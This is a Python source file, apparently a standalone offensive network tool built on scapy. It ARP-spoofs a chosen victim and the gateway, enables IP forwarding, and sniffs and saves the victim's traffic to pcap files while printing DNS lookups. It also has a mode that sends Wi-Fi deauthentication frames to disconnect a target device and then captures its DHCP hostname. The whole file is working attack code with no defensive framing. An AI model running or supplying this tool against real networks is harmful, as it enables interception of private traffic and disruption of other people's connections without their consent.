#!/usr/bin/python3

from scapy.all import *
import argparse
import time
from datetime import datetime
import multiprocessing
import sys
import re
import os

FOLDER_NAME = "CAPTURED"

class COLORED:
	GRAY = "\033[1;30;2m"
	RED = "\033[1;31;2m"
	GREEN = "\033[1;32;2m"
	YELLOW = "\033[1;33;2m"
	BLUE = "\033[1;34;2m"
	MAGENTA = "\033[1;35;2m"
	WHITE = "\033[1;37;2m"

def wlanInterface():
	""" Returns list for exp: ['wlan0'] """
	output = subprocess.Popen(["iw","dev"],stdout=subprocess.PIPE,universal_newlines=True)
	return [line.split(' ')[1].replace('\n','') for line in output.stdout if re.search("Interface",line)]

class Network:
	def __init__(self,IPrange):
		self.IPrange = IPrange
		self.gatewayIP = None
		self.gatewayMAC = None
		self.broadcast = "ff:ff:ff:ff:ff:ff"
		self.clients = {}
		self.ifaces = []
		self.gatewayInfo = []
		self.iDiP = {}

	def checkGateway(self):
		self.gatewayIP = list(self.clients)[0]
		self.gatewayMAC = self.clients.get(self.gatewayIP)
		output = subprocess.run(["route", "-n"],capture_output=True).stdout.decode().split('\n')
		for i in output:
			if self.gatewayIP in i:
				row = [j for j in i.split(' ') if j!='']
				if self.gatewayIP in row:
					self.gatewayInfo.append({'iface':row[-1],'ip':row[1],'mac':self.gatewayMAC})

	def ARPClientsOnNetwork(self):
		for client in arping(self.IPrange,verbose=0,timeout=2)[0]:
			self.clients.update({client[1].psrc:client[1].hwsrc})
		return True if len(self.clients) > 0 else False

	def getInterfaces(self):
		interfaces = subprocess.run(["ls","/sys/class/net"],capture_output=True)
		for interface in interfaces.stdout.decode().split('\n'):
			if interface!='':
				self.ifaces.append(interface)

	def filterClients(self):
		self.clients.pop(self.gatewayIP)

	def displayClients(self):
		for i,(cip,cmac) in enumerate(self.clients.items(),start=1):
			self.iDiP.update({str(i):cip})
			print(f"{COLORED.WHITE}[+] {COLORED.RED}DETECTED!!! {COLORED.WHITE}[ID:{i}][{COLORED.GREEN}{cip}{COLORED.WHITE}][{COLORED.GREEN}{cmac}{COLORED.WHITE}]")

	def getTargetIP(self):
		target = input(f"{COLORED.WHITE}Target ID: ")
		if not self.clients.get(self.iDiP.get(target)):
			return False
		return self.iDiP.get(target)

	def forwarding(self,status=1):
		subprocess.run(["sysctl","-w",f"net.ipv4.ip_forward={str(status)}"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)

	def getGatewayInfo(self):
		return self.gatewayInfo

	def getClientMac(self,ip):
		return self.clients.get(ip)

	def getIface(self):
		return self.ifaces

class Attack:
	def __init__(self,interfaces,IPrange,target,targetMac,gateways):
		self.interfaces = interfaces
		self.IPrange = IPrange
		self.target = target
		self.targetMac = targetMac
		self.gateways = gateways
		self.now = datetime.now()
		self.file = os.path.join(FOLDER_NAME,f"{self.now}.pcap")
		
	def spoof(self,target_ip,target_mac,spoof_ip):
			send(ARP(op=2,pdst=target_ip, hwdst=target_mac, psrc=spoof_ip),verbose=False)

	def sendSpoofed(self):
		while True:
			try:
				self.spoof(self.gateways[0]["ip"],self.gateways[0]["mac"],self.target)
				self.spoof(self.target,self.targetMac,self.gateways[0]["ip"])
				time.sleep(2)
			except KeyboardInterrupt:
				break

	def save(self,packet):
		if packet.haslayer(DNSQR):
			query = packet[DNSQR].qname
			query = query.decode()
			if query.startswith('www') or query.startswith('https') or query.startswith('http'):
				print(f"[{COLORED.MAGENTA}DNS{COLORED.WHITE}]: {query}")

		if not os.path.exists(FOLDER_NAME):
			os.mkdir(FOLDER_NAME)
		wrpcap(self.file,packet,append=True)		

	def sniffing(self):
		sniff(iface=self.interfaces[0],store=False,prn=self.save)

	def sendDeauthPacketsToTarget(self,targetMAC,gatewayMAC,Dpackets):
		dot11 = Dot11(addr1=targetMAC,addr2=gatewayMAC,addr3=gatewayMAC)
		packet = RadioTap()/dot11/Dot11Deauth(reason=7)
		sendp(packet,count=Dpackets,iface=wlanInterface()[0],verbose=0,inter=1./20)

class DHCPSniffer(Network):
	def __init__(self,IPrange,target_ip,Wlan):
		super(DHCPSniffer,self).__init__(IPrange)
		self.target_ip = target_ip
		self.wlan = Wlan
		self.protocol = "udp"
		self.ports = [67,68]
		self.MAC = None
		self.getInterfaces()
		self.SniffingThread = None

	def mac(self):
		try:
			return srp(Ether(dst=self.broadcast)/ARP(pdst=self.target_ip),timeout=1,verbose=False)[0][0][1].hwsrc
		except IndexError:
			return False

	def saveDeviceInfo(self,packet):
		dhcp = packet[DHCP].options
		for i in dhcp:
			if i[0]=='hostname':
				date = datetime.now()
				print(f"[{COLORED.GREEN}CAPTURED{COLORED.WHITE}] {self.target_ip} - {self.MAC} - {i[1].decode()}")
				with open("networkdevicesinfo.txt","a") as f:
					f.write(f"({date.strftime('%c')}):  {self.target_ip} - {self.MAC} - {i[1].decode()}\n")
				f.close()
				subprocess.run(["kill",str(self.SniffingThread.pid)])
				sys.exit(0)

	def start(self,Dpackets=2):
		try:
			self.ARPClientsOnNetwork()
			self.checkGateway()
			self.MAC = self.mac()
			while self.MAC==False:
				self.MAC = self.mac()
			print(f"[+] {self.target_ip} is on {self.wlan} network{COLORED.WHITE}")
			print(f"[+] Trying to capture DHCP packets...{COLORED.WHITE}")
			self.SniffingThread = multiprocessing.Process(target=self.Sniff)
			self.SniffingThread.start()
			Attack.sendDeauthPacketsToTarget(self,self.MAC,self.gatewayMAC,Dpackets)
		except KeyboardInterrupt:
			subprocess.run(["kill",str(self.SniffingThread.pid)])
			sys.exit(0)

	def Sniff(self):
		""" sniff DHCP packets for getting device hostname """
		sniff(iface=self.ifaces[0],store=False,prn=self.saveDeviceInfo,filter=f'{self.protocol} and ether src {self.MAC} and (port {self.ports[0]} or port {self.ports[1]})')

if __name__ == "__main__":
	try:
		parser = argparse.ArgumentParser()
		parser.add_argument("-R",'--range',help="network range to scan.\nExp: 192.168.0.0/24")
		parser.add_argument("-D",'--dhcp',help="Enter IP of the target to sniff DHCP packets and get device hostname")
		parser.add_argument("-DP",'--deauthPackets',default=60,type=int,help="Deauth packets you want to send to the target")
		args = parser.parse_args()

		network = Network(args.range)

		success = network.ARPClientsOnNetwork()
		if success:
			if args.dhcp:
				try:
					wlan = wlanInterface()[0]
				except IndexError:
					print("No wireless interface found!")
					sys.exit(0)
				sniff_DHCP = DHCPSniffer(args.range,args.dhcp,wlan)
				sniff_DHCP.start(args.deauthPackets)
				sys.exit(0)
			network.checkGateway()
			network.getInterfaces()
			network.filterClients()
			network.displayClients()
			network.forwarding(1)
			target = network.getTargetIP()
			print("[+] Intercepting Traffic...")
			if target:
				gateway = network.getGatewayInfo()
				targetInfo = network.getClientMac(target)
				interfaces = network.getIface()

				attack = Attack(interfaces,args.range,target,targetInfo,gateway)
				spoof_thread = multiprocessing.Process(target=attack.sendSpoofed)
				spoof_thread.start()
				attack.sniffing()
				print(f"All Traffic saved in {attack.file}")
			else:
				print("Invalid IP")
		else:
			print(f"clients not found on {args.range}\n")
			sys.exit(0)
	except PermissionError:
		print("This tool requries root privilegs")
	except KeyboardInterrupt:
		print("\nKeyboardInterrupt")
